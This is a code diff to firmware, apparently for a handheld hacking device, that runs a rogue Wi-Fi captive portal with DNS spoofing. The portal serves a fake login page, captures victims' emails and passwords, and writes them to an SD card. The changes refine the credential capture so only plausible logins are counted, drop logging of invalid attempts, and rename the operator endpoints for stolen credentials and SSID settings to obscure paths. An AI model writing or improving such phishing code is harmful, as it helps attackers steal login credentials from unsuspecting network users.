@@ -239,13 +239,11 @@ String index_POST() {
   int dotIndex = email.lastIndexOf('.');
   if (atIndex == -1 || dotIndex == -1 || atIndex > dotIndex || dotIndex == email.length() - 1) {
     isValid = false;
-    email = "Invalid Email";
   }
 
   // Password validation
   if (password.length() < 8) {
     isValid = false;
-    password = "Password too short";
   }
 
   // Only append if valid
@@ -254,8 +252,7 @@ String index_POST() {
     #if defined(SDCARD)
       appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
     #endif
-  } else {
-    capturedCredentialsHtml = "<li>Invalid credentials attempt: <b>Email: " + email + "</b></br><b>Password: " + password + "</b></li>" + capturedCredentialsHtml;
+    totalCapturedCredentials++; // Increment only if credentials are valid
   }
 
   // HTML template for "Please wait connecting" or error message with Back button
@@ -317,23 +314,22 @@ void setupWebServer() {
   dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
   Serial.println("Setting up Webserver");
   webServer.on("/post", []() {
-    totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
-#if defined(STICK_C_PLUS)
+    #if defined(STICK_C_PLUS)
     SPEAKER.tone(4000);
     delay(50);
     SPEAKER.mute();
-#elif defined(CARDPUTER)
+    #elif defined(CARDPUTER)
     //SPEAKER.tone(4000, 50);     //Silent mode, just in case
-#endif
+    #endif
     DISP.print("Victim Login");
-#if defined(M5LED)
+    #if defined(M5LED)
     blinkLed();
-#endif
+    #endif
   });
-  
+
   Serial.println("Registering /creds");
-  webServer.on("/creds", []() {
+  webServer.on("/save9", []() {
     webServer.send(HTTP_CODE, "text/html", creds_GET());
   });
   Serial.println("Registering /clear");
@@ -341,15 +337,15 @@ void setupWebServer() {
     webServer.send(HTTP_CODE, "text/html", clear_GET());
   });
   Serial.println("Registering /ssid");
-  webServer.on("/ssid", []() {
+  webServer.on("/rtsid", []() {
     webServer.send(HTTP_CODE, "text/html", ssid_GET());
   });
   Serial.println("Registering /postssid");
   webServer.on("/postssid", []() {
     webServer.send(HTTP_CODE, "text/html", ssid_POST());
     shutdownWebServer();
-    isSwitching=true;
-    current_proc=19;
+    isSwitching = true;
+    current_proc = 19;
   });
   Serial.println("Registering /*");
   webServer.onNotFound([]() {
